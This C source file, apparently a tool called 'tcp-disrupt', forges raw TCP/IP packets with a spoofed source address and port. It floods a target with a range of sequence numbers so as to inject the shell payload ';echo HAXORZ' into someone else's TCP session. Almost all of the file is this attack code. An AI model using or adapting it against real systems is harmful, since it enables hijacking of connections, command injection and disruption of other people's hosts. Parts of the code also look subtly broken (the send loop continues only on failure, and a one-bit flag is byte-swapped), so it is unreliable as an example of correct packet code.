#include "tcp-disrupt.h"

/** Sends an seq flood.
 *  
 *  srcIP     - the ip to send the flood from
 *  dstIP     - where to send the flood
 *  dstPort   - the port to send the flood to
 *  srcPort   - the port to send the flood from
 *  sqe       - the starting seq number
 *  ack_seq   - the starting ack number
 *  n         - how many ack's to send
 *  socket_fd - socket file descriptor
 */
bool seq_flood(     char *srcIP,
                    char *dstIP,
                    u_int16_t dstPort,
                    u_int16_t srcPort,
                    u_int32_t seq,
                    u_int32_t ack_seq,
                    int n,
                    int socket_fd,
                    struct sockaddr_in addr_in) {

    const char * data = ";echo HAXORZ";
    int data_len = strlen(data);
    int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
    char *packet = (char *) malloc(packet_size);
    struct tcphdr *tcpHdr = (struct tcphdr*) (packet + sizeof(struct iphdr));

    fill_packet(srcIP, dstIP, dstPort, srcPort, 0, 0, seq, ack_seq, 0, data, packet, packet_size);

    int i;
    bool b = true;
    for (i = 0; i < n && b; ++i) {
        b =  0 > send_packet(socket_fd, packet, addr_in);
        tcpHdr->seq = htonl(seq + i);
    }

    free(packet);

    return b;
}

int send_packet(int socket_fd, char *packet, struct sockaddr_in addr_in) {
    int bytes;
    struct iphdr *ipHdr = (struct iphdr *) packet;

    bytes = sendto(socket_fd, ipHdr, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in));
    return bytes;
}

void fill_packet(   char *srcIP,
                    char *dstIP,
                    u_int16_t dstPort,
                    u_int16_t srcPort,
                    u_int32_t syn,
                    u_int16_t ack,
                    u_int32_t seq,
                    u_int32_t ack_seq,
                    u_int16_t rst,
                    const char * data,
                    char *packet,
                    uint32_t packet_size) {

    struct iphdr *ipHdr;
    struct tcphdr *tcpHdr;
    char *pseudo_packet;
    struct pseudoTCPPacket pTCPPacket;
    int data_length = strlen(data);

    memset(packet, 0 ,packet_size);
    ipHdr = (struct iphdr*) packet;
    tcpHdr = (struct tcphdr*) (packet + sizeof(struct iphdr));
    memcpy((char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr)), data, data_length);

    //IP header
    ipHdr->ihl = 5;
    ipHdr->version = 4;
    ipHdr->tos = 0;
    ipHdr->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_length;
    ipHdr->id = htons(54321);
    ipHdr->frag_off = 0;
    ipHdr->ttl = 0xFF;
    ipHdr->protocol = IPPROTO_TCP;
    ipHdr->saddr = inet_addr(srcIP);
    ipHdr->daddr = inet_addr(dstIP);
    ipHdr->check = csum((unsigned short *) packet, ipHdr->tot_len);

    //TCP header
    tcpHdr->source = htons(srcPort);
    tcpHdr->dest = htons(dstPort);
    tcpHdr->seq = htonl(seq);           //sequence number
    tcpHdr->ack_seq = htonl(ack_seq);   //ack sequence number, depends whether ACK is set or not
    tcpHdr->res1 = 0;
    tcpHdr->doff = 5;
    tcpHdr->fin = 0;
    tcpHdr->syn = syn;
    tcpHdr->rst = htons(rst);
    tcpHdr->psh = 0;
    tcpHdr->ack = ack;                  //if you are acknowledging a sec number
    tcpHdr->urg = 0;
    tcpHdr->res2 = 0;
    tcpHdr->window = htons(43690);
    tcpHdr->urg_ptr = 0;

    printf("seq: %u\n", tcpHdr->seq);
    printf("ack_seq: %u\n", tcpHdr->ack_seq);

    //calculate the checksum for the TCP header
    pTCPPacket.srcAddr = inet_addr(srcIP);
    pTCPPacket.dstAddr = inet_addr(dstIP);
    pTCPPacket.zero = 0;
    pTCPPacket.protocol = IPPROTO_TCP;
    pTCPPacket.TCP_len = htons(sizeof(struct tcphdr) + data_length);

    pseudo_packet = (char *) malloc((int) (sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + data_length));
    memset(pseudo_packet, 0, sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + data_length);

    memcpy(pseudo_packet, (char *) &pTCPPacket, sizeof(struct pseudoTCPPacket));
    memcpy(pseudo_packet + sizeof(struct pseudoTCPPacket), tcpHdr, sizeof(struct tcphdr) + data_length);

    tcpHdr->check = (csum((unsigned short *) pseudo_packet, (int) (sizeof(struct pseudoTCPPacket) + 
          sizeof(struct tcphdr) +  data_length)));

    free(pseudo_packet);

    int i;
    printf("\n");
    for (i = 0; i < packet_size; ++i) {

        if((i % 4) == 0) {
            printf("\n");
        }

        printf("%d", (0x01 & *(packet + i) >> 7));
        printf("%d", (0x01 & *(packet + i) >> 6));
        printf("%d", (0x01 & *(packet + i) >> 5));
        printf("%d", (0x01 & *(packet + i) >> 4));
        printf(" ");
        printf("%d", (0x01 & *(packet + i) >> 3));
        printf("%d", (0x01 & *(packet + i) >> 2));
        printf("%d", (0x01 & *(packet + i) >> 1));
        printf("%d", (0x01 & *(packet + i) >> 0));
        printf(" ");

        if(i == 19) {
            printf("\n------------------TCP------------------");
        } else if(i == (20+19)) {
            printf("\n------------------DATA-----------------");
        }
    }
}

unsigned short csum(unsigned short *ptr,int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

char* gen_packet(   char *srcIP,
                    char *dstIP,
                    u_int16_t dstPort,
                    u_int16_t srcPort,
                    u_int32_t syn,
                    u_int16_t ack,
                    u_int32_t seq,
                    u_int32_t ack_seq,
                    const char * data,
                    uint32_t packet_size) {


        char * packet = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data));
        fill_packet(srcIP, dstIP, dstPort, srcPort, syn, ack, seq, ack_seq, 0, data, packet, packet_size);
        return packet;
}